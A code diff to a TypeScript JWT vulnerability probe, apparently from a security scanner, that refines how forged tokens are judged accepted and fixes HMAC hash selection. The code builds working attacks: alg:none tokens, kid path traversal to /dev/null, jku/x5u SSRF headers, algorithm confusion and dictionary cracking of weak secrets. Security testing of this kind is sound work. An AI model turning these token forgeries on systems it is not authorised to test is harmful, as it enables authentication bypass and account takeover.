@@ -80,13 +80,20 @@ export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackRe
     audience: Array.isArray(payload.aud) ? payload.aud.join(",") : typeof payload.aud === "string" ? payload.aud : null,
   };
 
-  const call = async (tok: string): Promise<number> => {
+  const call = async (tok: string): Promise<{ status: number; sha: string }> => {
     const r = await fetchUrl(input.endpoint, { ...opts, method: "GET", headers: { ...input.headers, authorization: `Bearer ${tok}` } });
-    return r.status;
+    return { status: r.status, sha: r.sha256.slice(0, 16) };
   };
+  /** accepted = tampered token answered like the real one. A bare status
+   *  match is NOT acceptance: uniform-200 / catch-all APIs answer 200 to
+   *  garbage too. Require status equality AND 2xx AND identical body hash
+   *  (differential discipline: status OR content migration, never bare 2xx). */
+  const acceptedLike = (res: { status: number; sha: string }, base: { status: number; sha: string }): boolean =>
+    res.status === base.status && res.status >= 200 && res.status < 300 && res.sha === base.sha;
 
   const attacks: JwtAttackResult["attacks"] = [];
-  const baseStatus = await call(input.token);
+  const base = await call(input.token);
+  const baseStatus = base.status;
   const record = (name: string, detail: string, tampered: number, vulnerableWhen: boolean, inconclusiveWhen = false): void => {
     attacks.push({ name, detail, baseline: baseStatus, tampered, verdict: vulnerableWhen ? "vulnerable" : inconclusiveWhen ? "inconclusive" : "safe" });
   };
@@ -96,8 +103,9 @@ export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackRe
     const noneTok = `${b64e(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64e(JSON.stringify(payload))}.`;
     const s = await call(noneTok);
     // vulnerable = the unsigned token authenticates identically to the real one
-    const same = s === baseStatus && (baseStatus >= 200 && baseStatus < 300);
-    record("alg_none", "unsigned token accepted (identical 2xx to signed token)", s, same, s >= 200 && s < 300 && s !== baseStatus);
+    // (status AND body hash — a bare status match is uniform-200 noise)
+    const same = acceptedLike(s, base);
+    record("alg_none", "unsigned token accepted (identical 2xx AND body hash to signed token)", s.status, same, s.status >= 200 && s.status < 300 && s.status !== baseStatus);
   }
 
   // --- 2. kid path traversal (LFI oracle) ---------------------------------
@@ -107,8 +115,8 @@ export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackRe
     const sig = createHmac("sha256", Buffer.alloc(0)).update(`${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}`).digest();
     const tok = `${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}.${b64e(sig)}`;
     const s = await call(tok);
-    const accepted = s === baseStatus && baseStatus >= 200 && baseStatus < 300;
-    record("kid_traversal_devnull", "kid=../../../dev/null with empty-key HMAC: accepted = server reads the file as HMAC key", s, accepted);
+    const accepted = acceptedLike(s, base);
+    record("kid_traversal_devnull", "kid=../../../dev/null with empty-key HMAC: accepted = server reads the file as HMAC key", s.status, accepted);
   }
 
   // --- 3. jku / x5u SSRF probe --------------------------------------------
@@ -120,8 +128,8 @@ export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackRe
     const s = await call(tok);
     // The URL points at a dead local port — if the server tries to fetch it
     // the request hangs/fails differently than a straight signature reject.
-    const diff = s !== baseStatus;
-    record(`${hk}_ssrf`, `${hk} header redirected to dead endpoint; status changed = server dereferenced attacker URL`, s, false, diff);
+    const diff = s.status !== baseStatus;
+    record(`${hk}_ssrf`, `${hk} header redirected to dead endpoint; status changed = server dereferenced attacker URL`, s.status, false, diff);
   }
 
   // --- 4. RS256 -> HS256 confusion ----------------------------------------
@@ -137,9 +145,14 @@ export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackRe
   // --- 5. weak secret dictionary (HS*) ------------------------------------
   if (String(header.alg).toUpperCase().startsWith("HS")) {
     const cands = input.secretCandidates ?? WEAK_SECRETS;
+    // Hash must follow the alg (HS384/HS512 were never crackable when pinned
+    // to sha256 — a silent miss).
+    const hashAlg = String(header.alg).toLowerCase().startsWith("hs") && String(header.alg).length === 5
+      ? `sha${String(header.alg).slice(2)}` as "sha256" | "sha384" | "sha512"
+      : "sha256";
     let cracked: string | null = null;
     for (const sec of cands) {
-      const sig = createHmac("sha256", sec).update(`${parts0(input.token)}.${parts1(input.token)}`).digest();
+      const sig = createHmac(hashAlg, sec).update(`${parts0(input.token)}.${parts1(input.token)}`).digest();
       if (b64e(sig) === (input.token.split(".")[2] ?? "")) { cracked = sec; break; }
     }
     if (cracked) {
